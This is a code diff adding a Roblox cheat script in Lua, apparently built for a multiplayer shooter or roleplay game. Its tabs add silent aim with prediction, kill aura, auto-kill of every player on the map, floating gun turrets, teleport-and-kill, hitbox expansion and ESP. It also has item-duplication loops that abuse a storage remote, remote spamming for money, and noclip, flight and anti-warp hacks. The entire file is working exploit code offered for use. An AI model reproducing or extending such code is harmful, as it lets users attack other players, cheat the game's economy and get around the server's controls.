+                if item:IsA("Tool") and item.Name ~= "Phone" and item.Name ~= "Boombox" then table.insert(guns, item) end 
+            end
+            for _, item in ipairs(char:GetChildren()) do 
+                if item:IsA("Tool") and item.Name ~= "Phone" and item.Name ~= "Boombox" then table.insert(guns, item) end 
+            end
+            
+            if #guns == 0 then continue end
+
+            for _, targetPlayer in ipairs(game.Players:GetPlayers()) do
+                if not mapSweeperEnabled then break end
+                if targetPlayer == plr or table.find(allowedNames, targetPlayer.Name) then continue end
+                
+                local tChar = targetPlayer.Character
+                local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
+                local tHum = tChar and tChar:FindFirstChild("Humanoid")
+
+                if tRoot and tHum and tHum.Health > 0 then
+                    local gun = guns[math.random(1, #guns)]
+                    local handle = gun:FindFirstChild("Handle")
+                    
+                    if handle then
+                        local bp = handle:FindFirstChild("SweeperBP") or Instance.new("BodyPosition", handle)
+                        local bg = handle:FindFirstChild("SweeperBG") or Instance.new("BodyGyro", handle)
+                        bp.Name = "SweeperBP"
+                        bg.Name = "SweeperBG"
+                        bp.MaxForce = Vector3.new(1,1,1) * 10^7
+                        bg.MaxTorque = Vector3.new(1,1,1) * 10^7
+                        
+                        local skyPos = tRoot.Position + Vector3.new(0, 300, 0)
+                        bp.Position = skyPos
+                        bg.CFrame = CFrame.new(skyPos, tRoot.Position)
+
+                        local remote = gun:FindFirstChild("shot") or gun:FindFirstChild("RemoteEvent")
+                        if remote then
+                            remote:FireServer(tRoot.Position + (tRoot.Velocity * 0.185))
+                        end
+                    end
+                    task.wait(0.02)
+                end
+            end
+        end
+        
+        if not mapSweeperEnabled then
+            for _, item in ipairs(plr.Backpack:GetDescendants()) do
+                if item.Name == "SweeperBP" or item.Name == "SweeperBG" then item:Destroy() end
+            end
+            if plr.Character then
+                for _, item in ipairs(plr.Character:GetDescendants()) do
+                    if item.Name == "SweeperBP" or item.Name == "SweeperBG" then item:Destroy() end
+                end
+            end
+        end
+    end)
+end)
+
+mainTab.newToggle("Sky Gun Sentry (Follow Me/Target)", "Guns fly above you and follow", false, function(state)
+    skySentryEnabled = state
+    task.spawn(function()
+        while skySentryEnabled do
+            local dt = RunService.RenderStepped:Wait()
+            local char = plr.Character
+            if not char or not char:FindFirstChild("HumanoidRootPart") then continue end
+            
+            local target = nil
+            if targetSearchName ~= "" then
+                for _, v in ipairs(game.Players:GetPlayers()) do
+                    if v.Name:lower():find(targetSearchName:lower()) and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
+                        target = v
+                        break
+                    end
+                end
+            end
+            
+            local guns = {}
+            for _, item in ipairs(plr.Backpack:GetChildren()) do 
+                if item:IsA("Tool") and item.Name ~= "Phone" and item.Name ~= "Boombox" then table.insert(guns, item) end 
+            end
+            for _, item in ipairs(char:GetChildren()) do 
+                if item:IsA("Tool") and item.Name ~= "Phone" and item.Name ~= "Boombox" then table.insert(guns, item) end 
+            end
+            
+            for i, gun in ipairs(guns) do
+                local handle = gun:FindFirstChild("Handle")
+                if handle then
+                    local bp = handle:FindFirstChild("SentryBP") or Instance.new("BodyPosition", handle)
+                    local bg = handle:FindFirstChild("SentryBG") or Instance.new("BodyGyro", handle)
+                    bp.Name = "SentryBP"
+                    bg.Name = "SentryBG"
+                    bp.MaxForce = Vector3.new(1,1,1) * 10^8
+                    bp.P = 50000
+                    bg.MaxTorque = Vector3.new(1,1,1) * 10^8
+                    bg.P = 50000
+                    
+                    local basePosition = (target and target.Character and target.Character:FindFirstChild("HumanoidRootPart")) 
+                                         and target.Character.HumanoidRootPart.Position 
+                                         or char.HumanoidRootPart.Position
+                    
+                    local offset = Vector3.new(math.sin(tick() + i) * 5, skyHeight, math.cos(tick() + i) * 5)
+                    local finalPos = basePosition + offset
+                    
+                    bp.Position = finalPos
+                    
+                    if target and target.Character and target.Character:FindFirstChild("Head") then
+                        local tHead = target.Character.Head.Position
+                        bg.CFrame = CFrame.new(finalPos, tHead)
+                        local remote = gun:FindFirstChild("shot") or gun:FindFirstChild("RemoteEvent")
+                        if remote then
+                            remote:FireServer(tHead + (target.Character.HumanoidRootPart.Velocity * 0.185))
+                        end
+                    else
+                        bg.CFrame = CFrame.new(finalPos, finalPos + char.HumanoidRootPart.CFrame.LookVector)
+                    end
+                end
+            end
+        end
+        
+        if not skySentryEnabled then
+            for _, item in ipairs(plr.Backpack:GetDescendants()) do
+                if item.Name == "SentryBP" or item.Name == "SentryBG" then item:Destroy() end
+            end
+            if plr.Character then
+                for _, item in ipairs(plr.Character:GetDescendants()) do
+                    if item.Name == "SentryBP" or item.Name == "SentryBG" then item:Destroy() end
+                end
+            end
+        end
+    end)
+end)
+
+mainTab.newSlider("Sky Height", "Adjust sentry altitude", 200, false, 50, function(v)
+    skyHeight = v
+end)
+
+mainTab.newToggle("Click Target to Warp & Kill", "Click player to instant eliminate", false, function(state)
+    clickKillEnabled = state
+end)
+
+mouse.Button1Down:Connect(function()
+    if not clickKillEnabled then return end
+    local targetObj = mouse.Target
+    if targetObj and targetObj.Parent then
+        local targetChar = targetObj.Parent:IsA("Model") and targetObj.Parent or targetObj.Parent.Parent
+        local targetHum = targetChar:FindFirstChild("Humanoid")
+        local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
+        
+        if targetHum and targetRoot and targetChar.Name ~= plr.Name then
+            sendScriptMsg("Lock-On", "Eliminating " .. targetChar.Name)
+            task.spawn(function()
+                local startTime = tick()
+                while targetHum.Health > 0 and (tick() - startTime) < 4 and clickKillEnabled do
+                    RunService.Heartbeat:Wait()
+                    if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+                        plr.Character.HumanoidRootPart.Velocity = Vector3.zero
+                        plr.Character.HumanoidRootPart.CFrame = targetRoot.CFrame * CFrame.new(0, 2, -3) * CFrame.Angles(0, math.pi, 0)
+                    end
+                    local aimPos = targetRoot.Position
+                    safeUltraShoot(aimPos)
+                end
+                if targetHum.Health <= 0 then sendScriptMsg("Success", "Target Eliminated!") end
+            end)
+        end
+    end
+end)
+
+mainTab.newToggle("Ultimate Gun Circle & Shoot", "Orbit all guns & follow YOU", false, function(state)
+    gunOrbitEnabled = state
+    
+    task.spawn(function()
+        while gunOrbitEnabled do
+            local dt = RunService.RenderStepped:Wait()
+            local char = plr.Character
+            if not char or not char:FindFirstChild("HumanoidRootPart") or not char:FindFirstChild("Head") then continue end
+            
+            local root = char.HumanoidRootPart
+            local target = getClosestPlayer(1000)
+            local targetPos = target and getUltimateTargetPos(target)
+            
+            local guns = {}
+            for _, item in ipairs(plr.Backpack:GetChildren()) do 
+                if item:IsA("Tool") and item.Name ~= "Phone" and item.Name ~= "Boombox" then 
+                    table.insert(guns, item) 
+                end 
+            end
+            for _, item in ipairs(char:GetChildren()) do 
+                if item:IsA("Tool") and item.Name ~= "Phone" and item.Name ~= "Boombox" then 
+                    table.insert(guns, item) 
+                end 
+            end
+            
+            orbitAngle = orbitAngle + (dt * 5) 
+            local radius = 6 
+            
+            for i, gun in ipairs(guns) do
+                local angle = orbitAngle + (i * (math.pi * 2 / #guns))
+                local offset = Vector3.new(math.cos(angle) * radius, 2, math.sin(angle) * radius)
+                local orbitPos = root.Position + offset
+                
+                local handle = gun:FindFirstChild("Handle")
+                if handle then
+                    handle.AssemblyLinearVelocity = Vector3.zero
+                    handle.AssemblyAngularVelocity = Vector3.zero
+                    
+                    local bp = handle:FindFirstChild("OrbitBP") or Instance.new("BodyPosition", handle)
+                    local bg = handle:FindFirstChild("OrbitBG") or Instance.new("BodyGyro", handle)
+                    
+                    bp.Name = "OrbitBP"
+                    bg.Name = "OrbitBG"
+                    
+                    bp.MaxForce = Vector3.new(1,1,1) * 10^9 
+                    bp.P = 100000 
+                    bg.MaxTorque = Vector3.new(1,1,1) * 10^9
+                    bg.P = 100000
+                    
+                    bp.Position = orbitPos
+                    
+                    if targetPos then
+                        bg.CFrame = CFrame.new(orbitPos, targetPos)
+                        local remote = gun:FindFirstChild("shot") or gun:FindFirstChild("RemoteEvent")
+                        if remote then
+                            remote:FireServer(targetPos)
+                        end
+                    else
+                        bg.CFrame = CFrame.new(orbitPos, orbitPos + root.CFrame.LookVector)
+                    end
+                end
+            end
+        end
+        
+        if not gunOrbitEnabled then
+            for _, item in ipairs(plr.Backpack:GetDescendants()) do
+                if item.Name == "OrbitBP" or item.Name == "OrbitBG" then item:Destroy() end
+            end
+            if plr.Character then
+                for _, item in ipairs(plr.Character:GetDescendants()) do
+                    if item.Name == "OrbitBP" or item.Name == "OrbitBG" then item:Destroy() end
+                end
+            end
+        end
+    end)
+end)
+
+mainTab.newToggle("ULTIMATE SILENT AIM", "100% Accuracy with Ping Prediction", false, function(state)
+    silentAimKill = state
+    task.spawn(function()
+        while silentAimKill do
+            local target = getClosestPlayer(1500) 
+            if target then
+                local aimPos = getUltimateTargetPos(target)
+                if aimPos then
+                    local gun = plr.Backpack:FindFirstChild("Gun") or (plr.Character and plr.Character:FindFirstChild("Gun"))
+                    if gun then
+                        local remote = gun:FindFirstChild("shot") or gun:FindFirstChild("RemoteEvent")
+                        if remote then
+                            if gun.Parent == plr.Backpack then plr.Character.Humanoid:EquipTool(gun) end
+                            remote:FireServer(aimPos)
+                        end
+                    end
+                end
+            end
+            RunService.Heartbeat:Wait() 
+        end
+    end)
+end)
+
+mainTab.newToggle("Burst Prediction Shoot", "Predict enemy movement for better hits", false, function(state)
+    burstPredictionEnabled = state
+    task.spawn(function()
+        while burstPredictionEnabled do
+            local target = getClosestPlayer(1500)
+            if target then
+                local prediction = getUltimateTargetPos(target)
+                if prediction then safeUltraShoot(prediction) end
+            end
+            task.wait(0.01)
+        end
+    end)
+end)
+
+mainTab.newToggle("Kill Aura (Reach)", "Damage players around you automatically", false, function(state)
+    reachEnabled = state
+    task.spawn(function()
+        while reachEnabled do
+            local target = getClosestPlayer(25)
+            if target and target.Character then
+                safeUltraShoot(target.Character.HumanoidRootPart.Position)
+            end
+            task.wait(0.1)
+        end
+    end)
+end)
+
+mainTab.newToggle("Ultra Fast Swap", "Lock-on rapid tool swapping", false, function(state)
+    autoSwapEnabled = state
+    task.spawn(function()
+        while autoSwapEnabled do
+            local target = getClosestPlayer(1500)
+            if target then 
+                local aimPos = getUltimateTargetPos(target)
+                if aimPos then safeUltraShoot(aimPos) end
+            end
+            task.wait(0.01)
+        end
+    end)
+end)
+
+mainTab.newToggle("Hitbox Expander", "Increase enemy hitboxes", false, function(state)
+    hitboxEnabled = state
+    task.spawn(function()
+        while hitboxEnabled do
+            for _, v in ipairs(game.Players:GetPlayers()) do
+                if v ~= plr and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
+                    v.Character.HumanoidRootPart.Size = Vector3.new(hitboxSize, hitboxSize, hitboxSize)
+                    v.Character.HumanoidRootPart.Transparency = 0.7
+                    v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really blue")
+                    v.Character.HumanoidRootPart.Material = "Neon"
+                    v.Character.HumanoidRootPart.CanCollide = false
+                end
+            end
+            task.wait(1)
+        end
+        for _, v in ipairs(game.Players:GetPlayers()) do
+            if v ~= plr and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
+                v.Character.HumanoidRootPart.Size = Vector3.new(2, 2, 1)
+                v.Character.HumanoidRootPart.Transparency = 1
+                v.Character.HumanoidRootPart.CanCollide = true
+            end
+        end
+    end)
+end)
+
+mainTab.newToggle("Warp & Orbit Spin", "Spin around target to avoid hits", false, function(state)
+    orbitSpinEnabled = state
+    local angle = 0
+    task.spawn(function()
+        while orbitSpinEnabled do
+            local dt = RunService.Heartbeat:Wait() 
+            if targetSearchName ~= "" then
+                for _, v in ipairs(game.Players:GetPlayers()) do
+                    if v.Name:lower():find(targetSearchName:lower()) and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
+                        local root = v.Character.HumanoidRootPart
+                        angle = angle + (7 * dt) 
+                        local offset = Vector3.new(math.cos(angle) * 7, 4, math.sin(angle) * 7)
+                        plr.Character.HumanoidRootPart.Velocity = Vector3.zero
+                        plr.Character.HumanoidRootPart.CFrame = CFrame.new(root.Position + offset, root.Position)
+                        local aimPos = getUltimateTargetPos(v)
+                        if aimPos then safeUltraShoot(aimPos) end
+                        break
+                    end
+                end
+            end
+        end
+    end)
+end)
+
+mainTab.newToggle("Shoot Forward Only", "Continuous shooting directly forward", false, function(state)
+    shootForwardEnabled = state
+    task.spawn(function()
+        while shootForwardEnabled do
+            if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+                local forwardPos = plr.Character.HumanoidRootPart.Position + (plr.Character.HumanoidRootPart.CFrame.LookVector * 1000)
+                safeUltraShoot(forwardPos)
+            end
+            task.wait(0.01)
+        end
+    end)
+end)
+
+mainTab.newLabel("Warp System")
+mainTab.newInput("Target Name", "Enter player name to follow", function(t) targetSearchName = t end)
+
+mainTab.newToggle("Warp & Kill (Above)", "Teleport above target", false, function(state)
+    tpAboveHeadEnabled = state
+    task.spawn(function()
+        while tpAboveHeadEnabled do
+            if targetSearchName ~= "" then
+                for _, v in ipairs(game.Players:GetPlayers()) do
+                    if v.Name:lower():find(targetSearchName:lower()) and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
+                        plr.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame * CFrame.new(0, 8, 0)
+                        plr.Character.HumanoidRootPart.Velocity = Vector3.zero
+                        local aimPos = getUltimateTargetPos(v)
+                        if aimPos then safeUltraShoot(aimPos) end
+                        break 
+                    end
+                end
+            end
+            task.wait(0.01)
+        end
+    end)
+end)
+
+---------------------------------------------------------
+-- [ TAB 2: VISUALS ]
+---------------------------------------------------------
+local visualTab = DrRayLibrary.newTab("Visuals", "rbxassetid://10734951151")
+
+visualTab.newInput("Custom Name", "Change text for Rainbow Name", function(t) customNameTag = t end)
+
+visualTab.newToggle("Rainbow Scroll Name", "LED Scrolling Rainbow Name Tag", false, function(state)
+    rainbowNameEnabled = state
+    task.spawn(function()
+        local text = customNameTag .. "          " 
+        local displayLength = 15 
+        local index = 1
+        
+        while rainbowNameEnabled do
+            local color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
+            local displayPart = ""
+            for i = 0, displayLength - 1 do
+                local charPos = ((index + i - 1) % #text) + 1
+                displayPart = displayPart .. string.sub(text, charPos, charPos)
+            end
+            game:GetService("ReplicatedStorage").NameTagRemoteEvent:FireServer(displayPart, color, 38)
+            index = index + 1
+            if index > #text then index = 1 end
+            task.wait(0.12)
+        end
+    end)
+end)
+
+visualTab.newButton("Full Bright / Full ESP", "See everything clearly", function()
+    game:GetService("Lighting").Brightness = 2
+    game:GetService("Lighting").ClockTime = 14
+    game:GetService("Lighting").FogEnd = 100000
+    for _, v in ipairs(game.Players:GetPlayers()) do
+        if v ~= plr and v.Character then
+            local highlight = Instance.new("Highlight", v.Character)
+            highlight.FillColor = Color3.fromRGB(255, 0, 0)
+        end
+    end
+end)
+
+visualTab.newToggle("Rainbow Character", "Cycle body colors", false, function(state)
+    rainbowCharacterEnabled = state
+    task.spawn(function()
+        while rainbowCharacterEnabled do
+            game:GetService("ReplicatedStorage").BloxbizRemotes.CatalogOnApplyToRealHumanoid:FireServer({["BodyColor"] = Color3.fromHSV(tick()%5/5, 1, 1)})
+            task.wait(0.1)
+        end
+    end)
+end)
+
+visualTab.newToggle("Rainbow Boombox", "12-Color Disco Mode", false, function(state)
+    rainbowBoomboxEnabled = state
+    task.spawn(function()
+        local colors = {"Really red", "Deep orange", "New Yeller", "Lime green", "Electric blue", "Really blue", "Hot pink", "Institutional white", "Black", "Magenta", "Cyan", "Alder"}
+        local index = 1
+        while rainbowBoomboxEnabled do
+            workspace.DRadio_Script.Color:FireServer(BrickColor.new(colors[index]))
+            index = (index % #colors) + 1
+            task.wait(0.3)
+        end
+    end)
+end)
+
+---------------------------------------------------------
+-- [ TAB 3: AUTO FARM ]
+---------------------------------------------------------
+local farmTab = DrRayLibrary.newTab("Auto Farm", "rbxassetid://10734951151")
+
+farmTab.newToggle("Auto Sell", "Automatic Money Farming", false, function(state)
+    autoSellEnabled = state
+    task.spawn(function()
+        while autoSellEnabled do game:GetService("ReplicatedStorage").House:FireServer("Sell") task.wait(0.01) end
+    end)
+end)
+
+farmTab.newToggle("Auto Armor / Food", "Spam remote to keep alive", false, function(state)
+    autoArmor = state
+    task.spawn(function()
+        while autoArmor do
+            game:GetService("ReplicatedStorage").ArmorRemote:FireServer()
+            task.wait(0.5)
+        end
+    end)
+end)
+
+---------------------------------------------------------
+-- [ TAB 4: AUTO SHOP ]
+---------------------------------------------------------
+local shopTab = DrRayLibrary.newTab("Auto Shop", "rbxassetid://10734951151")
+
+shopTab.newToggle("Auto Claim Items", "Retrieve items automatically", false, function(state) 
+    autoClaimEnabled = state 
+end)
+
+shopTab.newButton("Manual Claim (Once)", "Click to claim items once", function()
+    game:GetService("ReplicatedStorage").GetItemBack:FireServer()
+end)
+
+task.spawn(function() while task.wait(0.5) do if autoClaimEnabled then game:GetService("ReplicatedStorage").GetItemBack:FireServer() end end end)
+
+local function findAndClick(targetPos)
+    local closestClick = nil
+    for _, v in ipairs(game.Workspace:GetDescendants()) do
+        if v:IsA("ClickDetector") then
+            local part = v.Parent
+            if part and part:IsA("BasePart") and (part.Position - targetPos).Magnitude < 10 then
+                closestClick = v break
+            end
+        end
+    end
+    if closestClick then fireclickdetector(closestClick) return true end
+    return false
+end
+
+shopTab.newToggle("Auto Buy Gun Loop (Max 10)", "Dup up to 10 items per cycle", false, function(state)
+    autoBuyLoop = state
+    isForcingHolster = state
+    task.spawn(function()
+        local toolStorage = game:GetService("ReplicatedStorage"):WaitForChild("ToolStorage"):WaitForChild("ToolsStorage")
+        while autoBuyLoop do
+            if needsMore("Gun") then
+                for i = 1, 10 do 
+                    if not autoBuyLoop then break end 
+                    if findAndClick(Vector3.new(-76.84, 162.67, 231.24)) then 
+                        task.wait(0.1) 
+                        toolStorage:FireServer("Save", "Gun") 
+                    end 
+                end
+                task.wait(0.5)
+                for i = 1, 10 do 
+                    if not autoBuyLoop then break end 
+                    toolStorage:FireServer("Get", "Gun") 
+                    task.wait(0.05) 
+                end
+            end
+            task.wait(1)
+        end
+    end)
+end)
+
+shopTab.newToggle("Auto Buy Phone Loop (Max 10)", "Dup up to 10 items per cycle", false, function(state)
+    autoBuyPhoneLoop = state
+    isForcingHolster = state
+    task.spawn(function()
+        local toolStorage = game:GetService("ReplicatedStorage"):WaitForChild("ToolStorage"):WaitForChild("ToolsStorage")
+        while autoBuyPhoneLoop do
+            if needsMore("Phone") then
+                for i = 1, 10 do 
+                    if not autoBuyPhoneLoop then break end 
+                    if findAndClick(Vector3.new(89.44, 176.45, 269.08)) then 
+                        task.wait(0.1) 
+                        toolStorage:FireServer("Save", "Phone") 
+                    end 
+                end
+                task.wait(0.5)
+                for i = 1, 10 do 
+                    if not autoBuyPhoneLoop then break end 
+                    toolStorage:FireServer("Get", "Phone") 
+                    task.wait(0.05) 
+                end
+            end
+            task.wait(1)
+        end
+    end)
+end)
+
+shopTab.newToggle("Auto Buy Boombox Loop (Max 10)", "Dup up to 10 items per cycle", false, function(state)
+    autoBuyBoomboxLoop = state
+    isForcingHolster = state
+    task.spawn(function()
+        local toolStorage = game:GetService("ReplicatedStorage"):WaitForChild("ToolStorage"):WaitForChild("ToolsStorage")
+        while autoBuyBoomboxLoop do
+            if needsMore("Boombox") then
+                for i = 1, 10 do 
+                    if not autoBuyBoomboxLoop then break end 
+                    if findAndClick(Vector3.new(89.44, 176.45, 256.52)) then 
+                        task.wait(0.1) 
+                        toolStorage:FireServer("Save", "Boombox") 
+                    end 
+                end
+                task.wait(0.5)
+                for i = 1, 10 do 
+                    if not autoBuyBoomboxLoop then break end 
+                    toolStorage:FireServer("Get", "Boombox") 
+                    task.wait(0.05) 
+                end
+            end
+            task.wait(1)
+        end
+    end)
+end)
+
+---------------------------------------------------------
+-- [ TAB 5: MISC ]
+---------------------------------------------------------
+local miscTab = DrRayLibrary.newTab("Misc", "rbxassetid://10734951151")
+
+miscTab.newToggle("GOD ANTI-WARP", "High protection from TP/Force Anchor", false, function(state)
+    antiWarpEnabled = state
+    if state then
+        sendScriptMsg("System", "God Anti-Warp Activated")
+        if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+            lastValidPos = plr.Character.HumanoidRootPart.CFrame
+        end
+        
+        task.spawn(function()
+            while antiWarpEnabled do
+                local char = plr.Character
+                local hrp = char and char:FindFirstChild("HumanoidRootPart")
+                local hum = char and char:FindFirstChild("Humanoid")
+                
+                if hrp and hum and hum.Health > 0 then
+                    if hrp.Anchored then 
+                        hrp.Anchored = false 
+                    end
+                    
+                    for _, obj in ipairs(hrp:GetChildren()) do
+                        if obj:IsA("BodyVelocity") or obj:IsA("BodyGyro") or obj:IsA("RocketPropulsion") then
+                            obj:Destroy()
+                        end
+                    end
+                    
+                    if lastValidPos then
+                        local dist = (hrp.Position - lastValidPos.Position).Magnitude
+                        if dist > 50 and not (orbitSpinEnabled or tpAboveHeadEnabled) then
+                            hrp.CFrame = lastValidPos
+                            hrp.Velocity = Vector3.new(0,0,0)
+                        else
+                            lastValidPos = hrp.CFrame
+                        end
+                    end
+                end
+                RunService.Heartbeat:Wait()
+            end
+        end)
+    else
+        sendScriptMsg("System", "God Anti-Warp Disabled")
+    end
+end)
+
+miscTab.newToggle("Enable Flight", "Fly around map", false, function(state)
+    flightEnabled = state
+    local bg = Instance.new("BodyGyro", plr.Character.HumanoidRootPart)
+    local bv = Instance.new("BodyVelocity", plr.Character.HumanoidRootPart)
+    bg.P = 9e4
+    bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
+    bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
+    
+    task.spawn(function()
+        while flightEnabled do
+            bv.velocity = workspace.CurrentCamera.CFrame.LookVector * flySpeed
+            bg.cframe = workspace.CurrentCamera.CFrame
+            task.wait()
+        end
+        bg:Destroy()
+        bv:Destroy()
+    end)
+end)
+
+miscTab.newToggle("No Clip", "Walk through walls", false, function(state)
+    noClipEnabled = state
+    RunService.Stepped:Connect(function()
+        if noClipEnabled and plr.Character then
+            for _, v in pairs(plr.Character:GetDescendants()) do
+                if v:IsA("BasePart") then v.CanCollide = false end
+            end
+        end
+    end)
+end)
+
+miscTab.newToggle("Super Speed (80)", "Enable fast run", false, function(state)
+    task.spawn(function()
+        while state do
+            if plr.Character and plr.Character:FindFirstChild("Humanoid") then plr.Character.Humanoid.WalkSpeed = 80 end
+            task.wait(0.1)
+        end
+        if plr.Character then plr.Character.Humanoid.WalkSpeed = 16 end
+    end)
+end)
+
+miscTab.newToggle("Super Jump (100)", "Enable high jump", false, function(state)
+    task.spawn(function()
+        while state do
+            if plr.Character and plr.Character:FindFirstChild("Humanoid") then plr.Character.Humanoid.JumpPower = 100 end
+            task.wait(0.1)
+        end
+        if plr.Character then plr.Character.Humanoid.JumpPower = 50 end
+    end)
+end)
+
+miscTab.newButton("Auto Lie & Return", "Bed warp for 3s", function()
+    local hrp = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
+    if hrp then
+        local old = hrp.CFrame
+        hrp.CFrame = CFrame.new(522.18, 178.18, -130.85)
+        task.wait(3)
+        hrp.CFrame = old
+    end
+end)
+
+miscTab.newLabel("Firefly Spawner (New)")
+
+miscTab.newInput("Amount", "Enter number", function(text)
+    local num = tonumber(text)
+    if num and num > 0 then fireflyCount = num end
+end)
+
+miscTab.newSlider("Adjust Amount", "1-1000", 1000, false, 100, function(v)
+    fireflyCount = v
+end)
+
+miscTab.newButton("Start Spawning Fireflies", "Spawn selected amount", function()
+    if not fireflySpawning then spawnFireflies(fireflyCount) end
+end)
+
+miscTab.newButton("Stop Spawning", "Stop immediately", function()
+    stopAllFirefly = true task.wait(0.5) stopAllFirefly = false fireflySpawning = false
+end)
+
+miscTab.newButton("Clear All Fireflies", "Remove from map", function()
+    local c = 0
+    for _, obj in pairs(workspace:GetDescendants()) do
+        if string.find(string.lower(obj.Name), "firefly") then obj:Destroy() c = c + 1 end
+    end
+    print("Cleared: "..c)
+end)
